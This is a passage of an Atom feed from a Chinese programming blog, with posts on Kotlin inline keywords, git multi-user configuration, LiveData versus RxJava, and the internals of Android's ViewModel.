print(&quot;Non-local control flow&quot;)</span><br><span class="line"></span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了<code>inline</code>，kotlin中还有<code>noinline</code>、<code>crossinline</code>等关键字。</p><p><code>noinline</code>顾名思义，和<code>inline</code>含义相反。用于标记某个lambda，表示这个lambda在<code>inline</code> Function内不内联。</p><p><code>crossinline</code>用的比较少，主要用于在嵌套的Function内部使用lambda，被<code>crossinline</code>标记的lambda不能在lambda内部使用return。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inline fun higherOrderFunction(crossinline aLambda: () -&gt; Unit) &#123;</span><br><span class="line"></span><br><span class="line">    normalFunction &#123;</span><br><span class="line">        aLambda() //must mark aLambda as crossinline to use in this context.</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun normalFunction(aLambda: () -&gt; Unit) &#123;</span><br><span class="line">  </span><br><span class="line">    return</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun callingFunction() &#123;</span><br><span class="line"></span><br><span class="line">    higherOrderFunction &#123; </span><br><span class="line"></span><br><span class="line">        return  //Error. Can&apos;t return from here.</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的&lt;code&gt;inline&lt;/code&gt;关键字。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title>git多用户配置实践</title>
    <link href="https://deskid.github.io/2017/09/02/git%E5%A4%9A%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E5%AE%9E%E8%B7%B5/"/>
    <id>https://deskid.github.io/2017/09/02/git多用户配置实践/</id>
    <published>2017-09-02T15:46:23.000Z</published>
    <updated>2018-11-14T03:23:11.816Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要记录git多用户配置。</p><a id="more"></a><p>常见的使用场景是公司和github的用户配置不一样：</p><p>普通做法是为每个repo单独配置 User config</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --local user.name &quot;name&quot;</span><br><span class="line">git config --local user.email &quot;email&quot;</span><br></pre></td></tr></table></figure><p>repo多起来后再这样手动配置就有点麻烦了。考虑到公司和github的repo地址一个是gitlab，一个是github，所以有没有能根据repo地址自动配置git用户信息的方法呢？</p><!-- more --><h2 id="git-user-自动配置">git user 自动配置</h2><p>git 的User信息配置分两种，一种是<code>global</code>，一种是<code>local</code>。其中<code>local</code>配置信息存储在<code>./.git/config</code>文件中。</p><p>可以通过<code>hook</code>在每次commit之前判断repo地址来修改config，达到自动化的目的。</p><p>1、修改 <code>~/.gitconfig</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[init]</span><br><span class="line">templatedir = ~/.git/templates</span><br></pre></td></tr></table></figure><p>这会使得每个 git 目录在init时都会都会引用这个 templates 中的 配置。</p><p>2、新建 <code>~/.git/templates/hooks/pre_commit</code> 文件，在这个文件中的命令会在每次commit前执行。</p><script src="//gist.github.com/d025f48d4cc7e25b51e3c999c00c2a19.js"></script><p>3、<code>chmod +x ./pre_commit</code></p><p>然后在下次 commit 时会自动切换 user config 了，如果需要在已经初始化的 git 项目中使用这个 hook，重新运行 <code>git init</code> 即可。</p><h2 id="修改已提交的作者信息">修改已提交的作者信息</h2><p>有时候用了错误的User config提交了一条commit，怎样只修改User信息呢？</p><p>1、找到错误commit的上一个commit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase -i HASH</span><br></pre></td></tr></table></figure><p>如果要修改第一条commit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase -i --root</span><br></pre></td></tr></table></figure><p>2、使用 <code>edit</code> 修改该commit，保存退出后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stopped at c9441b4... init</span><br><span class="line">You can amend the commit now, with</span><br><span class="line">    </span><br><span class="line">git commit --amend</span><br><span class="line">    </span><br><span class="line">Once you are satisfied with your changes, run</span><br><span class="line">    </span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure><p>3、用 <code>--amend</code> 修改 author</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit --amend --author=&quot;user &lt;user@email.com&gt;&quot; --no-edit</span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure><p>4、强推到远程分支</p><h2 id="参考">参考</h2><ol><li><a href="http://stackoverflow.com/a/23107012/4422890" target="_blank" rel="noopener">http://stackoverflow.com/a/23107012/4422890</a></li><li><a href="https://www.git-tower.com/learn/git/faq/change-author-name-email" target="_blank" rel="noopener">https://www.git-tower.com/learn/git/faq/change-author-name-email</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要记录git多用户配置。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="https://deskid.github.io/categories/git/"/>
    
    
      <category term="git" scheme="https://deskid.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>LiveData VS RxJava</title>
    <link href="https://deskid.github.io/2017/08/07/LiveData-vs-Rxjava/"/>
    <id>https://deskid.github.io/2017/08/07/LiveData-vs-Rxjava/</id>
    <published>2017-08-07T04:13:23.000Z</published>
    <updated>2018-11-14T03:24:15.561Z</updated>
    
    <content type="html"><![CDATA[<p>本文比较了<code>LiveData</code>和<code>RxJava</code>在概念上的不同。</p><a id="more"></a><p>在看<code>LiveData</code>官方文档时，我第一反应是——这是一个自带生命周期的类似RxJava的轮子。<br><img src="/media/14985453596283.jpg" alt></p><p>我一开始把它看做RxJava来用，在使用一段时间后，LiveData总是让我觉得别扭。</p><p>问题就在于这两个概念实际上不太一样。</p><!-- more --><ol><li><p>LiveData 是一个 holder 而不是 steam。它存储的是最新一个value，当有观测者观测时总是会获得这个最新的数据。</p><blockquote><p>LiveData is essentially just like <code>BehaviorRelay</code>. It is a data holder that allows subscribers. But it also has an active/inactive state depending on number of current subscribers, so it’s kinda like <code>replay(1).publish().refCount()</code>. So, uh, <code>RxReplayingShare</code>.</p></blockquote></li><li><p>另外一个不一样的线程模型。RxJava提供了一套简洁的线程切换方法，而LiveData所有操作都运行于主线程。</p></li><li><p>LiveData 会根据LifecycleOwner，自动管理subscriber的生命周期，RxJava则不会。</p></li><li><p>LiveData 只提供了<code>Transformations.map</code>、<code>Transformations.switchMap</code>这两种操作符，远没有RxJava灵活。使用上也不支持链式调用。tips：可以使用Kotlin的扩展函数优化下</p> <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;X, Y&gt;</span> LiveData<span class="type">&lt;X&gt;</span>.<span class="title">map</span><span class="params">(transform: (<span class="type">x</span>: <span class="type">X</span>)</span></span> -&gt; Y): LiveData&lt;Y&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Transformations.map(<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span><span class="symbol">@map</span> transform(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="type">&lt;X, Y&gt;</span> LiveData<span class="type">&lt;X&gt;</span>.<span class="title">switchMap</span><span class="params">(transform: (<span class="type">x</span>: <span class="type">X</span>)</span></span> -&gt; LiveData&lt;Y&gt;): LiveData&lt;Y&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Transformations.switchMap(<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span><span class="symbol">@switchMap</span> transform(it)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>从学习曲线上来讲，LiveData对新人更友好（这里可能是先学习过RxJava，有了流式的思想基础后再来学习LiveData造成的错觉。）</p></li></ol><p>在 Twitter 上看到 <a href="https://twitter.com/chrisbanes/status/893490549138784256" target="_blank" rel="noopener">@chrisbanes</a> 提供的一种 LiveData 实践思路。</p><ol><li>LiveData 作为 UI 前端的数据展示层</li><li>RxJava 作为 后端的 network 请求层</li></ol><p><img src="/media/15020765905808.jpg" alt></p><p>而 Google 官方提供的 Demo 中，是直接让Retrofit 网络请求返回 LiveData。</p><p>两者相比，我觉得还是@chrisbanes的实践更合理。为什么这么说呢？</p><ol><li><p>LiveData 不适合作为 network 请求的返回值。</p><p><img src="/media/15020768865133.jpg" alt></p><blockquote><p>It’s weird to me to expose an HTTP request as live data because it really isn’t. I would think you would always have some intermediary class which allowed for things like refreshing the HTTP data and updating the existing <code>LiveData</code>.</p></blockquote><p>因为大部分的 network 请求都是一次性的(one-shot)，而使用 LiveData 给人的感觉是数据可能会在之后更新。那么更适合的场景其实是LiveData 和数据库(Room)配合</p></li><li><p>利用 LiveData 的自动 clear 特性，管理RxJava 的 subscriptions，消除了RxJava 内存泄露的可能。</p></li><li><p>能利用 RxJava 简洁的线程切换的能力。</p></li></ol><p>至于 RxJava Stream 和 LiveData 之间的互相转换可以使用<a href="https://developer.android.com/reference/android/arch/lifecycle/LiveDataReactiveStreams.html" target="_blank" rel="noopener"><code>LiveDataReactiveStreams</code></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文比较了&lt;code&gt;LiveData&lt;/code&gt;和&lt;code&gt;RxJava&lt;/code&gt;在概念上的不同。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://deskid.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 ViewModel</title>
    <link href="https://deskid.github.io/2017/07/28/ViewModel/"/>
    <id>https://deskid.github.io/2017/07/28/ViewModel/</id>
    <published>2017-07-28T05:14:14.000Z</published>
    <updated>2018-11-14T03:26:20.314Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要研究了<code>ViewModel</code>的概念、使用方式和内部实现原理。</p><a id="more"></a><h2 id="1-viewmodel概念">1. ViewModel概念</h2><p><code>ViewModel</code> 用来管理和存储UI相关的数据，和普通的 data store 不同的是：<code>ViewModel</code>会帮你处理 UI Controller 的生命周期带来的问题。</p><p>这里需要解释，为什么我们需要处理 UI Controller的生命周期，不处理会有什么问题呢？</p><ol><li><p>数据需要在 UI Controller destroyed 后清理，防止内存泄露。</p></li><li><p>数据需要处理 UI Controller 的生命周期。举个例子，Activity 在 configuration changes 后(旋转屏幕等)，系统会销毁之前的Activity，并重建一个Activity 实例。这时数据如何在这两个Activity实例之间保持一致。</p></li></ol><p>没有<code>ViewModel</code>，解决问题的思路：</p><ol><li>使用 static data holder（需要处理lifecycle）</li><li>将数据持久化<ol><li>持久化的位置——本地、云端？</li><li>持久化时机——即时、lifecycle callbacks？</li></ol></li></ol><p><code>ViewModel</code>号称解决了上述问题，它是怎么做到的呢？</p><!-- more --><h2 id="2-viewmodel使用">2. ViewModel使用</h2><p>下面先提供个demo：</p><p>1 . <code>MyViewModel.java</code></p><p>使用 ViewModel 很简单，直接继承 <code>ViewModel</code> 就好了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModel</span> <span class="keyword">extends</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span> myInt = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2 . <code>MainActivity.java</code></p><p>和 UI Controller 绑定：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">   setContentView(R.layout.activity_main);</span><br><span class="line">   mViewModel = ViewModelProviders.of(<span class="keyword">this</span>).get(ScoreViewModel.class);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样就足够了，不过，工厂方法<code>ViewModelProviders</code>默认使用 ViewModel 的无参构造函数。如果需要指定构造函数，还需要自己实现<code>Factory</code>接口的<code>create</code>方法。</p><p>3 . <code>MyViewModelFactory.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModelFactory</span> <span class="keyword">implements</span> <span class="title">ViewModelProvider</span>.<span class="title">Factory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> AppDatabase mAppDatabase;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyViewModelFactory</span><span class="params">(AppDatabase appDatabase)</span> </span>&#123;</span><br><span class="line">       mAppDatabase = appDatabase;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> &lt;T extends ViewModel&gt; <span class="function">T <span class="title">create</span><span class="params">(Class&lt;T&gt; modelClass)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> (T) <span class="keyword">new</span> MyViewModel(mAppDatabase);;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MyViewModel.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewModel</span> <span class="keyword">extends</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyViewModel</span><span class="params">(AppDatabase appDatabase)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用姿势变成：</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"><span class="addition">+    MyViewModelFactory factory = new MyViewModelFactory(database);</span></span><br><span class="line"><span class="addition">+    MyViewModel viewModel = ViewModelProviders.of(this, factory).get(MyViewModel.class);</span></span><br><span class="line"></span><br><span class="line">    //....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，还可以通过传入同一个<code>getActivity()</code>，使得ViewModel成为Activity的多个Fragment之间数据传递层。</p><p>需要注意的是，不要在ViewModel中持有 UI Controller 或者 Context，这是因为ViewModel的寿命长于 UI Controller 从而会导致内存泄露。</p><h2 id="3-viewmodel优点">3. ViewModel优点</h2><ol><li>ViewModel 数据层 和 UI Controller 之间分离的很干净。UI Controller 不用负责获取数据，也不用在重建时负责数据的有效性。</li><li>ViewModel 数据层能感知到 UI Controller 的生命周期：保证 UI Controller 重建后，持有的是同一个ViewModel数据实例;  UI Controller 结束生命周期后，系统自动调用ViewModel的<code>clear()</code>，释放资源。</li><li>配合 LiveData 使用效果更佳。</li><li>之前放到<code>onSaveInstanceState()</code>的复杂数据，现在可以放到ViewModel（系统UI相关的除外）</li><li>由于职责划分更加清晰，测试更方便。</li></ol><h2 id="4-drive-deeper">4. drive deeper</h2><p>ViewModel 是如何实现在 UI Controller 重建后维持同一个实例的呢？</p><p>回答这个问题之前，先补充一点背景知识。</p><p><code>Fragment.java</code> 里有一个方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRetainInstance</span><span class="params">(<span class="keyword">boolean</span> retain)</span> </span>&#123;</span><br><span class="line">   mRetainInstance = retain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的注释如下：</p><blockquote><p>Control whether a fragment instance is retained across Activity re-creation (such as from a configuration change). This can only be used with fragments not in the back stack. If set, the fragment lifecycle will be slightly different when an activity is recreated:</p></blockquote><ul><li><code>onDestroy()</code> will not be called (but <code>onDetach()</code> still will be, because the fragment is being detached from its current activity).</li><li><code>onCreate(Bundle)</code> will not be called since the fragment is not being re-created.</li><li><code>onAttach(Activity)</code> and <code>onActivityCreated(Bundle)</code> <strong>will</strong> still be called.</li></ul><p>上面这段话体现在Fragment生命周期上如图所示：</p><p><img src="/media/15011367324387.jpg" alt></p><p>注意，在官方图的基础上加的红线部分就是设置了<code>setRetainInstance</code>之后的生命周期变动。</p><p>Fragment在设置<code>setRetainInstance(true)</code>后，当 host Activity re-creation 时，fragment不会被destroyed，而是keep在内存中。当re-creation时，fragment 跳过 <code>onDestroy()</code> 和 <code>onCreate()</code>生命周期，并重新执行一遍 <code>onAttach()</code> 和 <code>onDetach()</code>之间的回调。</p><p>因此在 Activity re-creation 后，fragment还是原来的那个实例。</p><p>看完这个介绍，是不是有所启发了？</p><p>回到 ViewModel 的实现来。</p><p>下面大图是 Google Android Architecture Components 的部分框架(图来自<a href="https://medium.com/@hitherejoe" target="_blank" rel="noopener">Joe Birch</a>)，</p><p><img src="/media/15011493872486.jpg" alt></p><p>红色框线部分是<code>ViewModel</code>的部分。</p><p><img src="/media/15011494656226.jpg" alt></p><p>可见ViewModel主要构成部分如下：</p><ul><li><code>ViewModelProviders</code></li><li><code>ViewModelProvider</code></li><li><code>ViewModelStores</code></li><li><code>ViewModelStore</code></li><li><code>ViewModel</code></li></ul><p>其中，主角 <code>ViewModel</code> 是一个只有<code>onCleared</code>方法的抽象类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewModel</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCleared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述问题的答案显然不在这里。</p><p>下面从调用入口开始看：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyViewModel viewModel = ViewModelProviders.of(<span class="keyword">this</span>, factory).get(MyViewModel.class);</span><br></pre></td></tr></table></figure><p>获取<code>ViewModel</code> 两个步骤：</p><ol><li>通过<code>ViewModelProviders.of()</code>返回的<code>ViewModelProvider</code></li><li>再通过<code>ViewModelProvider.get()</code>获取ViewModel实例。</li></ol><p><code>ViewModelProviders</code> 是创建<code>ViewModelProvider</code>的工具类，通过<code>of()</code>方法获取<code>ViewModelProvider</code><br><img src="/media/15011510361313.jpg" alt></p><p>贴<code>of</code>代码(其一)：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@MainThread</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ViewModelProvider <span class="title">of</span><span class="params">(@NonNull Activity activity, @NonNull Factory factory)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> ViewModelProvider(ViewModelStores.of(activity), factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码简单的调用构造函数创建了<code>ViewModelProvider</code>。</p><p>而<code>ViewModelProvider</code> 又是创建<code>ViewModel</code>的工具类，提供了<code>get</code>方法获得 <code>ViewModel</code> 。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NonNull</span></span><br><span class="line">   <span class="meta">@MainThread</span></span><br><span class="line">   <span class="keyword">public</span> &lt;T extends ViewModel&gt; <span class="function">T <span class="title">get</span><span class="params">(@NonNull String key, @NonNull Class&lt;T&gt; modelClass)</span> </span>&#123;</span><br><span class="line">       ViewModel viewModel = mViewModelStore.get(key);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (modelClass.isInstance(viewModel)) &#123;</span><br><span class="line">           <span class="keyword">return</span> (T) viewModel;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (viewModel != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="comment">// <span class="doctag">TODO:</span> log a warning.</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       viewModel = mFactory.create(modelClass);</span><br><span class="line">       mViewModelStore.put(key, viewModel);</span><br><span class="line">       <span class="keyword">return</span> (T) viewModel;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>由上面代码可以看到，构造函数传入的<code>ViewModelStore</code>（<code>ViewModelStores.of()</code> 的返回值） 这里充当了ViewModel缓存的功能，<code>Factory</code>则直接负责ViewModel的创建。</p><p><code>ViewModelStores</code>和<code>ViewModelStore</code>的关系也是类似的，<code>ViewModelStores</code>是创建<code>ViewModelStore</code>的工具类。</p><p><code>ViewModelStores</code>也有几个<code>of</code>方法。<br><img src="/media/15011531800293.jpg" alt></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ViewModelStore <span class="title">of</span><span class="params">(FragmentActivity activity)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> HolderFragment.holderFragmentFor(activity).getViewModelStore();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码的具体实现中，注意<code>holderFragmentFor</code>这里，大概猜到了具体实现和<code>Fragment</code>有关。</p><p>继续深入。</p><p><code>holderFragmentFor</code>是<code>HolderFragment</code>的类方法，参数为<code>ViewModelProviders.of()</code>传入的<code>activity</code>实例（或者<code>fragment</code>），返回一个<code>HolderFragment</code>实例。内部实现则是委托给了<code>HolderFragmentManager</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestrictTo</span>(RestrictTo.Scope.LIBRARY_GROUP)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HolderFragment <span class="title">holderFragmentFor</span><span class="params">(FragmentActivity activity)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> sHolderFragmentManager.holderFragmentFor(activity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ViewModelStores.of()</code> 调用<code>HolderFragment</code>的<code>getViewModelStore()</code>，取出其内部持有<code>ViewModelStore</code>，并作为返回值返回。</p><p><code>HolderFragment.java</code> 其他的代码不贴，只看构造函数就行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HolderFragment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   setRetainInstance(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>setRetainInstance(true)</code> 保证了<code>HolderFragment</code>在Activity重建时不会被销毁，在这个基础上，<code>HolderFragment</code> 保证了<code>ViewModelStore</code>在 Activity 重建之后维持同一个实例。</p><p>至于<code>ViewModelStore</code>的实现，很简单，不到50行代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewModelStore</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HashMap&lt;String, ViewModel&gt; mMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(String key, ViewModel viewModel)</span> </span>&#123;</span><br><span class="line">        ViewModel oldViewModel = mMap.get(key);</span><br><span class="line">        <span class="keyword">if</span> (oldViewModel != <span class="keyword">null</span>) &#123;</span><br><span class="line">            oldViewModel.onCleared();</span><br><span class="line">        &#125;</span><br><span class="line">        mMap.put(key, viewModel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> ViewModel <span class="title">get</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mMap.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (ViewModel vm : mMap.values()) &#123;</span><br><span class="line">            vm.onCleared();</span><br><span class="line">        &#125;</span><br><span class="line">        mMap.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取得<code>ViewModelStore</code>之后，通过 <code>get(key)</code> 最终获得了一个<code>ViewModel</code>。</p><p>那么，<code>HolderFragmentManager</code>又是怎么将 UI Controller 和 <code>HoldFragment</code>关联起来的呢？</p><p>第一次获取<code>ViewModel</code>时，<code>HolderFragmentManager</code>创建<code>HolderFragment</code>，并将其添加到 activity state。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> HolderFragment <span class="title">createHolderFragment</span><span class="params">(FragmentManager fragmentManager)</span> </span>&#123;</span><br><span class="line">  HolderFragment holder = <span class="keyword">new</span> HolderFragment();</span><br><span class="line">  fragmentManager.beginTransaction().add(holder, HOLDER_TAG).commitAllowingStateLoss();</span><br><span class="line">  <span class="keyword">return</span> holder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 Activity 重建后，第二次获取ViewModel时，<code>HolderFragmentManager</code> 内部通过调用<code>FragmentManager.findFragmentByTag</code>来查找之前commit的<code>HolderFragment</code>，由于<code>HolderFragment</code> 不会在Activity重建时销毁，所以这里返回的是同一个<code>HolderFragment</code>实例。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> HolderFragment <span class="title">findHolderFragment</span><span class="params">(FragmentManager manager)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (manager.isDestroyed()) &#123;</span><br><span class="line">      <span class="comment">// throw Exception;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Fragment fragmentByTag = manager.findFragmentByTag(HOLDER_TAG);</span><br><span class="line">  <span class="comment">// check null and type...</span></span><br><span class="line">  <span class="keyword">return</span> (HolderFragment) fragmentByTag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结<code>HolderFragmentManager</code>的存储关系如下图：</p><p><img src="/media/15012142793225.jpg" alt="HolderFragmentManager示意图"></p><p>一个 UI Controller 对应一个<code>HolderFragment</code>。两者之间是通过<code>FragmentManager.findFragmentByTag</code>互相关联起来的。</p><p><code>HolderFragment</code> 持有<code>ViewModelStore</code>实例。而 <code>ViewModelStore</code> 内部通过String key对应着多个<code>ViewModel</code>。</p><p>其实很早很早以前 Android 社区就流行使用没有UI的 <code>Fragment</code> 来做为 MVC 中的 Controller。这种<code>Fragment</code> 被称为<code>Headless Fragment</code>，其中就利用到了 <code>setRetainInstance(true)</code> 的这个特性。</p><p><code>ViewModel</code>的设计实现，也算是官方承认了<code>Headless Fragments</code>的这种非正统使用模式了。（<code>Fragment</code>的设计者估计做梦也不会想到竟然还有这种操作吧）。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要研究了&lt;code&gt;ViewModel&lt;/code&gt;的概念、使用方式和内部实现原理。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://deskid.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>kotlin 深入学习笔记(三)</title>
    <link href="https://deskid.github.io/2017/07/07/kotlin-learn-notes-3/"/>
    <id>https://deskid.github.io/2017/07/07/kotlin-learn-notes-3/</id>
    <published>2017-07-07T08:46:23.000Z</published>
    <updated>2018-11-14T03:28:49.779Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍kotlin的几个特性如下：</p><ul><li>默认参数</li><li>命名参数</li><li>std自带函数</li></ul><a id="more"></a><p>继续，如果把编程语言看做一款应用产品，产品的功能对应语言特性，那么大多数编程语言功能都还算齐全，该有的也都有了，剩下一些增增减减，发个版本迭代也是和应用开发类似。这个应用的目的是为了什么呢，为了实现OOP？为了实现函数式编程？</p><p>不对，这种思路是本末倒置。就像我们写诗是为了抒发情感，而不是为了拼凑五言绝句平平仄仄平的韵律格式。编程语言设计出来，不是为了实现某个设计哲学，而是要为了被程序员使用。</p><p>就像面对 NPE，程序员说：我们不想写if null 判断，语言设计师说：可是添加个 null 实现起来更简单啊，我们加上吧。</p><p>你猜，要是编程语言是一个应用产品，这样的产品经理会不会被用户打。</p><h3 id="6-默认参数">6. 默认参数</h3><p>Java为了避免在一个方法中传入过多参数，往往有两个解决方法：</p><ol><li>将参数用builder封装一下</li><li>写多个方法重载，每次重载设置最后一个参数为默认值</li></ol><!-- more --><p>这里举个方法重载的例子：<br>下面代码是用Java写的一个路由跳转类的toUriAct方法封装。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr)</span> </span>&#123;</span><br><span class="line">        toUriAct(ctx, uriStr, (HashMap)<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">toUriAct</span><span class="params">(Context ctx, String uriStr, 